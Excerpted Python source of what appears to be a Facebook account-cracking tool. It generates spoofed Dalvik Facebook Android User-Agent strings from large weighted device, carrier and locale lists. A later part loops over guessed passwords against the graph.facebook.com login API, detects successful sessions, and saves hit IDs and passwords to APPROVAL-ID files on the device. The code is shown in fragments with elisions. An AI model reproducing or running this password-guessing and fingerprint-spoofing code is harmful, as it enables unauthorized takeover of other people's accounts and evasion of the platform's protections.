...
def random_dalvik(seed: Optional[int] = None) -> str:
    """
    Generate a realistic Dalvik-style Facebook Android User-Agent (Global, Oct 2025).
    - Seed optional for reproducible output.
    - Weighted device/brand selection (Samsung-heavy).
    - Returns a single UA string ready to use.
    """
    if seed is not None:
        random.seed(seed)
    ...
    # small model suffix sometimes
    model_suffix = ""
    if random.random() < 0.18:
        suffix_tokens = ["Pro", "Plus", "5G", "Neo", "Lite", "SE", "G"]
        candidate = " " + random.choice(suffix_tokens)
        if candidate.strip() not in FBDV:
            model_suffix = candidate

    FBDV_token = FBDV + model_suffix
...
def global_oct2025(seed: Optional[int] = None,
                                             force_locale: Optional[str] = None,
                                             force_carrier: Optional[str] = None) -> str:
    """
    Option B — Global + BD balanced Dalvik-style Facebook Android UA generator (Oct 2025).
    - seed: Optional[int] for reproducible output.
    - force_locale: Optional[str] to pin FBLC (e.g., "bn_BD" or "en_US").
    - force_carrier: Optional[str] to pin FBCR (e.g., "GRAMEENPHONE" or "Vodafone").
    - Returns: single Dalvik-style UA string with FB tokens suitable for b-graph, mbasic, api.
    - Device pool: ~100 Android devices (Samsung-heavy, global + BD).
    """
    ...
    # Android versions common in 2025 (focus on realistic ones)
    ANDROID_VERS = ["11", "12", "13", "14"]
    FBSV = random.choice(ANDROID_VERS)

    # Realistic build tags seen across vendors
    BUILD_TAGS = [
        "UP1A.240905.003", "UQ1A.240905.002", "UP1A.240806.001", "UQ1A.240705.001",
        "TQ3A.240705.010", "TP1A.240905.004", "UQ1A.250101.001", "UP1A.250201.002",
        "TP1A.250301.001", "RP1A.250501.001", "SQ1A.240812.002", "TQ1A.240101.001",
        "SQC1.240701.001", "OQ1A.241101.001"
    ]
    BUILD = random.choice(BUILD_TAGS)

    # Display profiles (density, width, height)
    DISPLAY_PROFILES: List[Tuple[str, str, str]] = [
        ("1.5", "720", "1440"), ("1.75", "800", "1600"), ("2.0", "760", "1600"),
        ("2.25", "1080", "2200"), ("2.5", "1080", "2400"), ("2.625", "1080", "2460"),
        ("2.75", "1220", "2600"), ("3.0", "1200", "2800"), ("3.25", "1440", "3120"),
        ("3.5", "1440", "3088")
    ]
    density, width, height = random.choice(DISPLAY_PROFILES)

    # Locales & carriers (global + BD)
    LOCALES = ["en_US", "en_GB", "es_ES", "fr_FR", "pt_BR", "de_DE", "it_IT",
               "en_IN", "bn_BD", "tr_TR", "pt_PT", "es_MX", "id_ID"]
    CARRIERS = [
        "TMobile", "Verizon", "AT&T", "Vodafone", "Orange", "EE", "O2",
        "Jio", "Airtel", "Dialog", "Telcel", "Movistar",
        "GRAMEENPHONE", "Robi", "Banglalink", "TELKOMSEL", "SKTelecom",
        "NTTDocomo", "Optus", "Zong", "Fido", "Claro"
    ]
    FBLC = force_locale if force_locale else random.choice(LOCALES)
    FBCR = force_carrier if force_carrier else random.choice(CARRIERS)
    ...
    # -------------------------
    # Working device pool (~100 Android-only models)
    # Samsung-heavy, globally-usable, BD-friendly entries included
    # -------------------------
    WORKING_DEVICES: Tuple[Tuple[str, str], ...] = (
        # Samsung (wide coverage)
        ("Samsung", "Galaxy A04s"), ("Samsung", "Galaxy A14 5G"), ("Samsung", "Galaxy A15 5G"),
        ("Samsung", "Galaxy A25 5G"), ("Samsung", "Galaxy A35 5G"), ("Samsung", "Galaxy A55 5G"),
        ("Samsung", "Galaxy F14"), ("Samsung", "Galaxy M14 5G"), ("Samsung", "Galaxy M15"),
        ("Samsung", "Galaxy M34"), ("Samsung", "Galaxy M54 5G"), ("Samsung", "Galaxy S20 FE 5G"),
        ("Samsung", "Galaxy S21 FE 5G"), ("Samsung", "Galaxy S22"), ("Samsung", "Galaxy S22 Ultra"),
        ("Samsung", "Galaxy S23"), ("Samsung", "Galaxy S23 Ultra"), ("Samsung", "Galaxy S24"),
        ("Samsung", "Galaxy S24 Ultra"), ("Samsung", "Galaxy Z Flip5"), ("Samsung", "Galaxy Z Fold5"),
        ("Samsung", "Galaxy XCover 6 Pro"), ("Samsung", "Galaxy A05s"), ("Samsung", "Galaxy M13"),
        ("Samsung", "Galaxy Tab S9"),

        # Xiaomi / Redmi / Poco / Black Shark
        ("Xiaomi", "Redmi Note 12"), ("Xiaomi", "Redmi Note 13 5G"), ("Xiaomi", "Redmi Note 13 Pro+ 5G"),
        ("Xiaomi", "Redmi Note 14 Pro 5G"), ("Xiaomi", "13T Pro"), ("Xiaomi", "13 Pro"),
        ("Xiaomi", "12T Pro"), ("Xiaomi", "Mi 11 Ultra"), ("Poco", "Poco X6 Pro 5G"),
        ("Poco", "Poco F6"), ("Poco", "Poco F6 Pro"), ("Xiaomi", "Black Shark 6"), ("Xiaomi", "12S Ultra"),
        ("Xiaomi", "Redmi 12"), ("Xiaomi", "12T"), ("Poco", "Poco M5 Pro"),

        # Realme / Oppo / Vivo / iQOO
        ("Realme", "Realme 12 Pro+ 5G"), ("Realme", "Realme 13 Pro+"), ("Realme", "GT Neo 6"),
        ("Oppo", "Reno 11 Pro"), ("Oppo", "Reno 12 Pro"), ("Oppo", "Find X6"),
        ("Oppo", "A78"), ("Vivo", "Vivo V30 Pro"), ("Vivo", "Vivo X100 Pro"),
        ("Vivo", "Y200"), ("Vivo", "Y76s"), ("iQOO", "Neo 9 Pro"), ("iQOO", "9 Pro"),
        ("Realme", "Narzo 70x 5G"), ("OnePlus", "Nord 3"),

        # OnePlus / Google / Motorola / Nothing / ASUS / Sony / Honor
        ("OnePlus", "OnePlus Nord N30"), ("OnePlus", "OnePlus 12"), ("OnePlus", "OnePlus 12R"),
        ("Google", "Pixel 7"), ("Google", "Pixel 7a"), ("Google", "Pixel 8"), ("Google", "Pixel 8 Pro"),
        ("Google", "Pixel Fold"), ("Motorola", "Edge 40"), ("Motorola", "Edge 50 Pro"),
        ("Motorola", "Razr 40"), ("Nothing", "Phone (2)"), ("Nothing", "Phone (2a)"),
        ("ASUS", "Zenfone 10"), ("ASUS", "ROG Phone 7"), ("Sony", "Xperia 10 V"), ("Sony", "Xperia 1 V"),
        ("Sony", "Xperia Ace 3"), ("Honor", "Magic6 Pro"), ("Honor", "90 Pro"),

        # Tecno / Infinix / Itel / Walton / Symphony (BD-friendly)
        ("Tecno", "Camon 30 Premier 5G"), ("Tecno", "Camon 30 Pro"), ("Tecno", "Pova 6 Pro"),
        ("Infinix", "GT 20 Pro"), ("Infinix", "Note 40 Pro 5G"), ("Itel", "S24"),
        ("Itel", "Vision 6 Plus"), ("Walton", "Primo H11"), ("Walton", "Primo S8"),
        ("Symphony", "Z70 Pro"), ("itel", "A56"),

        # Lenovo / Nokia / ZTE / Sharp / Meizu / others
        ("Lenovo", "Legion Y90"), ("Lenovo", "K14 Pro"), ("Lenovo", "K13 Pro"),
        ("Nokia", "XR21"), ("Nokia", "G22"), ("ZTE", "Axon 40 Ultra"),
        ("ZTE", "Blade A7"), ("Sharp", "AQUOS R7"), ("Sharp", "AQUOS sense7"),
        ("Meizu", "18s"), ("BLU", "G91"),

        # Additional mid/high widely-used global devices
        ("Xiaomi", "13 Ultra"), ("Oppo", "A77"), ("Vivo", "Y16"), ("Realme", "C55"),
        ("Samsung", "Galaxy A35s"), ("Motorola", "Moto G Power"), ("Samsung", "Galaxy M33"),
        ("OnePlus", "OnePlus 11R"), ("Honor", "Magic5 Pro"), ("Huawei", "P60 Pro"),  # sparse Huawei presence
    )

    # -------------------------
    # Buckets & weighted selection (B: Global + BD; Samsung-heavy)
    # Approx weights: Samsung ~50%, Xiaomi family ~20%, Realme/Oppo/Vivo/iQOO ~15%, Premium (Google/OnePlus/ASUS/Moto/Sony/Honor) ~10%, Others ~5%
    # -------------------------
    samsung_bucket = [d for d in WORKING_DEVICES if d[0].lower() == "samsung"]
    xiaomi_bucket = [d for d in WORKING_DEVICES if d[0].lower() in ("xiaomi", "poco", "redmi", "black shark")]
    realme_oppo_vivo_bucket = [d for d in WORKING_DEVICES if d[0].lower() in ("realme", "oppo", "vivo", "iqoo")]
    ...
    if r < 0.50 and samsung_bucket:
        ...
        FBMF, FBDV = random.choice(realme_oppo_vivo_bucket)
    elif r < 0.95 and premium_bucket:
        FBMF, FBDV = random.choice(premium_bucket)
    else:
        FBMF, FBDV = random.choice(others_bucket) if others_bucket else random.choice(WORKING_DEVICES)

    FBBD = FBMF  # brand used for FBBD token

    # Add small realistic suffix sometimes (but avoid duplicating existing model text)
    model_suffix = ""
    if random.random() < 0.18:
        suffix_tokens = ["Pro", "Plus", "5G", "Neo", "Lite", "SE", "G", "Ultra"]
        candidate = " " + random.choice(suffix_tokens)
        if candidate.strip().lower() not in FBDV.lower():
            model_suffix = candidate

    FBDV_token = FBDV + model_suffix

    # Occasional short hardware codename in parentheses
    codename = ""
    if random.random() < 0.12:
        cparts = ["r1", "c2", "codenameX", "alpha", "beta", "phoenix", "olympus", "zeus"]
        codename = f" ({random.choice(cparts)})"

    FBDV_FINAL = f"{FBDV_token}{codename}"

    # Build final UA string — Dalvik style with Facebook tokens
    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {FBSV}; {FBDV_FINAL} Build/{BUILD}) "
        f"[FBAN/{FBAN};FBAV/{FBAV};FBBV/{FBBV};"
        f"FBDM/{{density={density},width={width},height={height}}};"
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 8.4
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik(),
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      cps.append(sid)
                      open('/sdcard/SalaM/APPROVAL-M1-26-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': global_oct2025(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      print(f"\r\r\033[1;30m[APPROVAL-ID] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/APPROVAL-M2-26-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
